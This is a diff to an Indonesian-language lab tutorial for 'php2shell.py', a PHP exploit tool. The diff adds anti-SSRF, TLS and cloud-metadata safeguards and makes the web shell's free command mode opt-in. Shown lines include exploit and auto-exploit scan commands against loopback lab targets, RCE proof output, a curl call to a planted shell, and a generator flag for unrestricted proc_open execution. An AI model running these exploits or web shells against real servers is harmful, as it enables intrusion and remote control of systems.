@@ -28,6 +28,37 @@ Prasyarat target agar rantai jalan (dicek di §4):
 - `memory_limit` kecil (lab: 8M)
 - PHP rentan: ≤ 8.2.34 / ≤ 8.3.35 / ≤ 8.4.26 / ≤ 8.5.11
 
+**Penting untuk lab loopback:** target privat (loopback, RFC1918, link-local)
+DITOLAK secara default oleh kebijakan anti-SSRF — request tidak dikirim sama
+sekali. Karena contoh di tutorial ini semuanya `127.0.0.1`, setiap perintah
+`php2shell.py` terhadap lab butuh `--allow-private-target`:
+
+```bash
+python php2shell.py detect -u http://127.0.0.1:8093/ --allow-private-target
+```
+
+Tanpa flag itu hasilnya bukan "target mati", melainkan
+`diblokir kebijakan tujuan (anti-SSRF)`. Endpoint metadata cloud
+(`169.254.169.254`, `fd00:ec2::254`, `100.100.100.200`, `192.0.0.192`) tetap
+ditolak **selalu** — flag itu tidak membukanya, dan tidak ada flag mana pun yang
+membukanya.
+
+### 0b. Tiga flag pagar transport (default aman, pelonggaran opt-in)
+
+| Flag | Default | Efek | Pakai kapan |
+|---|---|---|---|
+| `--insecure` | verifikasi TLS AKTIF (`CERT_REQUIRED` + cek hostname) | MATIKAN verifikasi sertifikat | lab bersertifikat self-signed; jangan di target nyata |
+| `--no-follow-redirects` | redirect diikuti manual, maks 5 hop, tiap hop divalidasi anti-SSRF | berhenti di 3xx pertama | target yang redirect-nya tidak relevan / ingin lihat 302 mentah |
+| `--allow-private-target` | loopback/RFC1918/link-local DITOLAK | izinkan target privat | lab lokal (`127.0.0.1`) |
+
+Ketiganya milik semua subcommand yang memakai transport (`scan`, `detect`,
+`preflight`, `exploit`), dan ketiganya mati secara default. `--insecure` bukan
+cara memperbaiki "SSL error" di target nyata — sertifikat yang tidak terverifikasi
+berarti siapa pun di jalur bisa membaca request, termasuk cookie sesi target.
+
+Metadata cloud tidak punya saklar sama sekali: `--allow-private-target` hanya
+membuka rentang privat biasa.
+
 ---
 
 ## 1. `version` — identitas & advisories (read-only)
@@ -55,7 +86,7 @@ Versi rentan terakhir per branch: 8.2.34 / 8.3.35 / 8.4.26 / 8.5.11.
 ## 3. `detect` — kenali target tanpa menyerang (read-only)
 
 ```bash
-python php2shell.py detect -u http://127.0.0.1:8093/
+python php2shell.py detect -u http://127.0.0.1:8093/ --allow-private-target
 ```
 Output penting:
 ```
@@ -72,7 +103,7 @@ skor     : 75/90  (READY)
 
 ## 4. `preflight` — cek kelima syarat teknis rantai
 ```bash
-python php2shell.py preflight -u http://127.0.0.1:8093/
+python php2shell.py preflight -u http://127.0.0.1:8093/ --allow-private-target
 ```
 Membaca: memory_limit, upload_progress, display_errors, worker-model,
 retry kekalahan; ringkasan `siap eksploitasi: YA/TIDAK` + BLOCKER bila ada.
@@ -82,7 +113,7 @@ retry kekalahan; ringkasan `siap eksploitasi: YA/TIDAK` + BLOCKER bila ada.
 
 ```bash
 # kanal bukti file (lab ber-mount /out):
-python php2shell.py exploit -u http://127.0.0.1:8093/ --yes --proof-file p1
+python php2shell.py exploit -u http://127.0.0.1:8093/ --yes --proof-file p1 --allow-private-target
 #   → PROOF (…s): uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 # variasi perintah proof (whitelist):
@@ -118,15 +149,38 @@ curl -s -X POST -d "k=$PW" -d 'c=id' http://127.0.0.1:8097/<nama>.php
 
 **6b. Generator lengkap (2 varian: web login-page + CLI fleksibel):**
 ```bash
+# varian aman (default): whitelist perintah saja
 /home/lota1337/myenv/bin/python shell/web_shell_gen.py --out /run/media/lota1337/AarSSDaputra/p2s-lab/shell-live --ttl 24 [--variant web|cli|both]
+
+# mode bebas = eksekusi perintah ARBITRER dari browser → opt-in eksplisit
+/home/lota1337/myenv/bin/python shell/web_shell_gen.py --out /run/media/lota1337/AarSSDaputra/p2s-lab/shell-live --ttl 24 \
+    --variant web --allow-free-mode
 # keluar: 2 file shell + CREDENTIALS-<ts>.txt (mode 600)
 ```
 - Varian **web**: satu file (HTML+CSS+JS+PHP), halaman login di browser
-  (BUKAN popup Basic), terminal interaktif + opsi "mode bebas" (perintah
-  apa pun setelah login).
-- Varian **cli**: Basic Auth diterima (popup browser pun jalan) + mode
-  bebas dengan `c` biasa.
+  (BUKAN popup Basic), terminal interaktif dengan whitelist perintah.
+- Varian **cli**: Basic Auth diterima (popup browser pun jalan) + whitelist
+  perintah lewat parameter `c`.
+- **Mode bebas TIDAK ada di build default.** `allow_free_mode` default `False`;
+  blok PHP mode bebas, checkbox, dan JS-nya tidak ditulis ke file sama sekali
+  kecuali kamu menambahkan `--allow-free-mode`. Flag itu mencetak peringatan tegas
+  ke **stderr** dan mencatat `free mode: YA (proc_open, perintah arbitrer)` di
+  `CREDENTIALS-<ts>.txt`. Mode bebas memanggil `proc_open()` dengan teks yang
+  diketik di browser — itu **RCE tanpa batas, setara shell interaktif**, bukan
+  fitur kenyamanan. Minta hanya bila engagement memang mengizinkan demonstrasi
+  eksekusi penuh, dan hapus shell begitu selesai.
 - bcrypt+TTL+audit sama; kredensial ditulis `CREDENTIALS-<ts>.txt`.
+
+> **Password bukan pengganti pembatasan hak akses OS.** Password bcrypt, TTL, dan
+> rate limit melindungi *file shell* dari pengguna web lain; tidak satu pun
+> membatasi apa yang bisa dijalankan shell setelah login. Batas sesungguhnya
+> adalah hak akses user web server di level OS/PHP: `chmod` pada webroot,
+> `disable_functions` (`proc_open`, `shell_exec`, `system`, `passthru`, `exec`),
+> `open_basedir`, user low-privilege khusus, atau container. Kalau PHP target bisa
+> memanggil `proc_open`, mode bebas melakukan persis apa yang boleh dilakukan user
+> itu — password tidak mengubah apa pun soal itu. Pasang pembatasan OS/PHP dulu,
+> baru putuskan apakah shell perlu dipasang.
+
 
 ## 7. Up-shell dari RCE (puncak) — DUA jalur
 
@@ -183,9 +237,9 @@ Error umum:
 
 ```bash
 printf "http://127.0.0.1:8093/\nhttp://127.0.0.1:8099/\n" > targets.txt
-python php2shell.py scan -l targets.txt --json hasil.json --csv hasil.csv
+python php2shell.py scan -l targets.txt --json hasil.json --csv hasil.csv --allow-private-target
 # lanjut eksploit otomatis target READY (hati-hati; hanya lab):
-python php2shell.py scan -l targets.txt --exploit --yes
+python php2shell.py scan -l targets.txt --exploit --yes --allow-private-target
 ```
 Ringkasan warna: vulnerable merah, patched hijau, unknown kuning.
 Opsi berguna: `--check-version`, `--audit audit.jsonl` (jejak JSONL tiap
